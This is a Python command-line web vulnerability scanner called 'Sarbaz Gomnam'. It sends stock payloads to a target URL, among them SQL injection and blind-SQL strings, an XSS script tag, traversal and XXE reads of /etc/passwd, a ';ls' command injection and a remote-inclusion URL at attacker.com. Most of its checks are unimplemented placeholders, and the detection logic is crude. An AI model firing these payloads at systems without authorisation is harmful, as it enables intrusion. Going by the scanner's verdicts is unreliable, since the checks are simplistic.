Sarbaz gomnam

import requests
from bs4 import BeautifulSoup
import argparse

# Function to check for SQL Injection vulnerability
def check_sql_injection(url):
    payload = "' OR '1'='1"
    injected_url = f"{url}?id={payload}"

    response = requests.get(injected_url)

    if "Error" in response.text:
        print("SQL Injection vulnerability found!")
    else:
        print("No SQL Injection vulnerability detected.")

# Function to check for XSS vulnerability
def check_xss(url):
    payload = "<script>alert('XSS Vulnerability')</script>"
    injected_url = f"{url}?input={payload}"

    response = requests.get(injected_url)

    if payload in response.text:
        print("XSS vulnerability found!")
    else:
        print("No XSS vulnerability detected.")

# Function to check for Directory Traversal vulnerability
def check_directory_traversal(url):
    payload = "../../../../../../../../../etc/passwd"
    injected_url = f"{url}?file={payload}"

    response = requests.get(injected_url)

    if "root:" in response.text:
        print("Directory Traversal vulnerability found!")
    else:
        print("No Directory Traversal vulnerability detected.")

# Function to check for Command Injection vulnerability
def check_command_injection(url):
    payload = ";ls"
    injected_url = f"{url};{payload}"

    response = requests.get(injected_url)

    if "file1" in response.text:
        print("Command Injection vulnerability found!")
    else:
        print("No Command Injection vulnerability detected.")

# Function to check for CSRF vulnerability
def check_csrf(url):
    payload = "attacker-controlled-data"
    # Placeholder for CSRF check logic
    print("CSRF check logic not implemented.")

# Function to check for Remote Code Execution vulnerability
def check_remote_code_execution(url):
    payload = "attacker-controlled-command"
    # Placeholder for RCE check logic
    print("Remote Code Execution check logic not implemented.")

# Function to check for Sensitive Data Exposure vulnerability
def check_sensitive_data_exposure(url):
    payload = "sensitive-data"
    # Placeholder for sensitive data exposure check logic
    print("Sensitive Data Exposure check logic not implemented.")

# Function to check for XML External Entity (XXE) vulnerability
def check_xxe(url):
    payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
    # Placeholder for XXE check logic
    print("XXE check logic not implemented.")

# Function to check for Server-Side Request Forgery (SSRF) vulnerability
def check_ssrf(url):
    payload = "http://localhost:8080/private"
    # Placeholder for SSRF check logic
    print("SSRF check logic not implemented.")

# Function to check for Remote File Inclusion (RFI) vulnerability
def check_rfi(url):
    payload = "http://attacker.com/malicious.php"
    # Placeholder for RFI check logic
    print("Remote File Inclusion check logic not implemented.")

# Function to check for Local File Inclusion (LFI) vulnerability
def check_lfi(url):
    payload = "../../../../../../../../../etc/passwd"
    # Placeholder for LFI check logic
    print("Local File Inclusion check logic not implemented.")

# Function to check for Cross-Site Script Inclusion (XSSI) vulnerability
def check_xssi(url):
    payload = "<script>alert('XSSI Vulnerability')</script>"
    # Placeholder for XSSI check logic
    print("Cross-Site Script Inclusion check logic not implemented.")

# Function to check for Blind SQL Injection vulnerability
def check_sql_injection_blind(url):
    payload = "' AND SLEEP(5) --"
    # Placeholder for Blind SQL Injection check logic
    print("Blind SQL Injection check logic not implemented.")

# Function to check for CORS Misconfiguration vulnerability
def check_cors_misconfiguration(url):
    # Placeholder for CORS Misconfiguration check logic
    print("CORS Misconfiguration check logic not implemented.")

# Function to check for Insecure Direct Object References (IDOR) vulnerability
def check_idor(url):
    user_id = 1
    injected_url = f"{url}?user_id={user_id}"

    response = requests.get(injected_url)

    if "Unauthorized" in response.text:
        print("IDOR vulnerability found!")
    else:
        print("No IDOR vulnerability detected.")

# Function to check for Insecure Authentication vulnerability
def check_insecure_authentication(url):
    payload = "attacker"
    # Placeholder for Insecure Authentication check logic
    print("Insecure Authentication check logic not implemented.")

# Function to check for Server-Side Template Injection (SSTI) vulnerability
def check_ssti(url):
    payload = "{{7*7}}"
    # Placeholder for SSTI check logic
    print("Server-Side Template Injection check logic not implemented.")

# Function to check for Remote Code Execution (RCE) vulnerability
def check_rce(url):
    payload = "system('ls')"
    # Placeholder for RCE check logic
    print("Remote Code Execution check logic not implemented.")

# Function to scan for all vulnerabilities
def scan_all_vulnerabilities(url):
    print("Scanning for SQL Injection vulnerability...")
    check_sql_injection(url)
    print("Scanning for XSS vulnerability...")
    check_xss(url)
    print("Scanning for Directory Traversal vulnerability...")
    check_directory_traversal(url)
    print("Scanning for Command Injection vulnerability...")
    check_command_injection(url)
    print("Scanning for CSRF vulnerability...")
    check_csrf(url)
    print("Scanning for Remote Code Execution vulnerability...")
    check_remote_code_execution(url)
    print("Scanning for Sensitive Data Exposure vulnerability...")
    check_sensitive_data_exposure(url)
    print("Scanning for XML External Entity (XXE) vulnerability...")
    check_xxe(url)
    print("Scanning for Server-Side Request Forgery (SSRF) vulnerability...")
    check_ssrf(url)
    print("Scanning for Remote File Inclusion (RFI) vulnerability...")
    check_rfi(url)
    print("Scanning for Local File Inclusion (LFI) vulnerability...")
    check_lfi(url)
    print("Scanning for Cross-Site Script Inclusion (XSSI) vulnerability...")
    check_xssi(url)
    print("Scanning for Blind SQL Injection vulnerability...")
    check_sql_injection_blind(url)
    print("Scanning for CORS Misconfiguration vulnerability...")
    check_cors_misconfiguration(url)
    print("Scanning for Insecure Direct Object References (IDOR) vulnerability...")
    check_idor(url)
    print("Scanning for Insecure Authentication vulnerability...")
    check_insecure_authentication(url)
    print("Scanning for Server-Side Template Injection (SSTI) vulnerability...")
    check_ssti(url)
    print("Scanning for Remote Code Execution (RCE) vulnerability...")
    check_rce(url)

def main():
    parser = argparse.ArgumentParser(description="Sarbaz Gomnam: Web Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-a", "--auto", help="Automatically scan all vulnerabilities", action="store_true")
    parser.add_argument("--sqli", "-s", help="Scan for SQL Injection vulnerability", action="store_true")
    parser.add_argument("--xss", "-x", help="Scan for XSS vulnerability", action="store_true")
    parser.add_argument("--dirtrav", "-d", help="Scan for Directory Traversal vulnerability", action="store_true")
    parser.add_argument("--cmdi", "-c", help="Scan for Command Injection vulnerability", action="store_true")
    parser.add_argument("--csrf", help="Scan for CSRF vulnerability", action="store_true")
    parser.add_argument("--rce", help="Scan for Remote Code Execution vulnerability", action="store_true")
    parser.add_argument("--sensitive", help="Scan for Sensitive Data Exposure vulnerability", action="store_true")
    parser.add_argument("--xxe", help="Scan for XML External Entity vulnerability", action="store_true")
    parser.add_argument("--ssrf", help="Scan for Server-Side Request Forgery vulnerability", action="store_true")
    parser.add_argument("--rfi", help="Scan for Remote File Inclusion vulnerability", action="store_true")
    parser.add_argument("--lfi", help="Scan for Local File Inclusion vulnerability", action="store_true")
    parser.add_argument("--xssi", help="Scan for Cross-Site Script Inclusion vulnerability", action="store_true")
    parser.add_argument("--bsqli", help="Scan for Blind SQL Injection vulnerability", action="store_true")
    parser.add_argument("--cors", help="Scan for CORS Misconfiguration vulnerability", action="store_true")
    parser.add_argument("--idor", help="Scan for Insecure Direct Object References vulnerability", action="store_true")
    parser.add_argument("--auth", help="Scan for Insecure Authentication vulnerability", action="store_true")
    parser.add_argument("--ssti", help="Scan for Server-Side Template Injection vulnerability", action="store_true")

    args = parser.parse_args()

    if args.auto:
        scan_all_vulnerabilities(args.url)
    else:
        if args.sqli:
            check_sql_injection(args.url)
        if args.xss:
            check_xss(args.url)
        if args.dirtrav:
            check_directory_traversal(args.url)
        if args.cmdi:
            check_command_injection(args.url)
        if args.csrf:
            check_csrf(args.url)
        if args.rce:
            check_remote_code_execution(args.url)
        if args.sensitive:
            check_sensitive_data_exposure(args.url)
        if args.xxe:
            check_xxe(args.url)
        if args.ssrf:
            check_ssrf(args.url)
        if args.rfi:
            check_rfi(args.url)
        if args.lfi:
            check_lfi(args.url)
        if args.xssi:
            check_xssi(args.url)
        if args.bsqli:
            check_sql_injection_blind(args.url)
        if args.cors:
            check_cors_misconfiguration(args.url)
        if args.idor:
            check_idor(args.url)
        if args.auth:
            check_insecure_authentication(args.url)
        if args.ssti:
            check_ssti(args.url)

if __name__ == "__main__":
    main()
